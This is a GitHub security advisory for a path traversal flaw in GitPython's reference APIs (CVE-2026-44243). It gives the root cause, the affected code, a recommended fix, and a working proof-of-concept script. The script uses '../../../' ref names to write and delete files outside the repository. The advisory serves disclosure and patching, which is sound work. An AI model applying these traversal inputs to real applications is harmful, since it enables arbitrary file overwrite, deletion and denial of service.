# [H] GitPython reference APIs has a path traversal vulnerability that allows arbitrary file write and delete outside the repository

## Summary
Severity: High
Advisory: GHSA-7545-fcxq-7j24
CVE: CVE-2026-44243
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-7545-fcxq-7j24
Type: github-advisory

## Affected
- PyPI: `GitPython` — affected >=0 <3.1.48

## Details
## 🧾 Summary

A vulnerability in **GitPython** allows **attackers who can supply a crafted reference path to an application using GitPython** to **write, overwrite, move, or delete files outside the repository’s `.git` directory** via **insufficient validation of reference paths in reference creation, rename, and delete operations**.

---

## 📦 Affected Versions

* Affected: `<= 3.1.46` and current `main` (`3.1.47` in local checkout)

---

## 🧠 Details

### Vulnerability Type

**Path Traversal leading to Arbitrary File Write and Arbitrary File Deletion**

---

### Root Cause

Reference paths are validated when they are resolved for reading, but are not consistently validated before filesystem write, rename, and delete operations.

`SymbolicReference._check_ref_name_valid()` rejects traversal sequences such as `..`, but `SymbolicReference.create`, `Reference.create`, `SymbolicReference.set_reference`, `SymbolicReference.rename`, and `SymbolicReference.delete` still construct filesystem paths from attacker-controlled ref names without enforcing repository boundaries.

---

### Affected Code

```python
def set_reference(self, ref, logmsg=None):
    ...
    fpath = self.abspath
    assure_directory_exists(fpath, is_file=True)

    lfd = LockedFD(fpath)
    fd = lfd.open(write=True, stream=True)
    ...
```

```python
@classmethod
def delete(cls, repo, path):
    full_ref_path = cls.to_full_path(path)
    abs_path = os.path.join(repo.common_dir, full_ref_path)
    if os.path.exists(abs_path):
        os.remove(abs_path)
```

```python
def rename(self, new_path, force=False):
    new_path = self.to_full_path(new_path)
    new_abs_path = os.path.join(_git_dir(self.repo, new_path), new_path)
    cur_abs_path = os.path.join(_git_dir(self.repo, self.path), self.path)
    ...
    os.rename(cur_abs_path, new_abs_path)
```

---

### Attack Vector

**Local attack through application-controlled input passed into GitPython reference APIs**

### Authentication Required

**None at the library boundary. In practice, exploitation requires the ability to influence ref names supplied by the consuming application.**

---

## 🧪 Proof of Concept

### Setup

```bash
pip install GitPython==3.1.46
python poc.py
```

---

### Exploit

```python
import shutil
from pathlib import Path

from git import Repo
from git.refs.reference import Reference
from git.refs.symbolic import SymbolicReference

base = Path("gp-ghsa-poc").resolve()
if base.exists():
    shutil.rmtree(base)

repo_dir = base / "repo"
repo = Repo.init(repo_dir)

(repo_dir / "a.txt").write_text("init\n", encoding="utf-8")
repo.index.add(["a.txt"])
repo.index.commit("init")

outside_write = base / "outside_write.txt"
outside_delete = base / "outside_delete.txt"
outside_delete.write_text("DELETE ME\n", encoding="utf-8")

print(f"repo_dir       = {repo_dir}")
print(f"outside_write  = {outside_write}")
print(f"outside_delete = {outside_delete}")

Reference.create(repo, "../../../outside_write.txt", "HEAD")

print("\n[+] outside_write exists:", outside_write.exists())
if outside_write.exists():
    print("[+] outside_write content:")
    print(outside_write.read_text(encoding="utf-8"))

SymbolicReference.delete(repo, "../../../outside_delete.txt")

print("\n[+] outside_delete exists after delete:", outside_delete.exists())
```

---

### Result

```text
repo_dir       = ...\gp-ghsa-poc\repo
outside_write  = ...\gp-ghsa-poc\outside_write.txt
outside_delete = ...\gp-ghsa-poc\outside_delete.txt

[+] outside_write exists: True
[+] outside_write content:
<current HEAD commit SHA>

[+] outside_delete exists after delete: False
```

---

## 💥 Impact

### What can an attacker do?

* Create or overwrite files outside the repository metadata directory
* Delete attacker-chosen files reachable from the process permissions
* Corrupt application state or configuration files
* Cause denial of service by deleting or overwriting important files

---

### Security Impact

* **Confidentiality:** Low
* **Integrity:** High
* **Availability:** High

---

### Who is affected?

* Applications that expose GitPython reference operations to user-controlled input
* Git automation services, repository management backends, CI/CD helpers, and developer platforms
* Multi-user environments where one user can influence ref names processed on behalf of another workflow

---

## 🛠️ Mitigation / Fix

### Recommended Fix

```python
def _validate_ref_write_path(repo, path, *, for_git_dir=False):
    SymbolicReference._check_ref_name_valid(path)

    base = Path(repo.git_dir if for_git_dir else repo.common_dir).resolve()
    target = (base / path).resolve()

    if base not in [target, *target.parents]:
        raise ValueError(f"Reference path escapes repository boundary: {path}")

    return str(target)
```

```python
full_ref_path = cls.to_full_path(path)
_validate_ref_write_path(repo, full_ref_path)
```

## References
- https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7545-fcxq-7j24
- https://nvd.nist.gov/vuln/detail/CVE-2026-44243
- https://github.com/gitpython-developers/GitPython
- https://github.com/gitpython-developers/GitPython/releases/tag/3.1.48
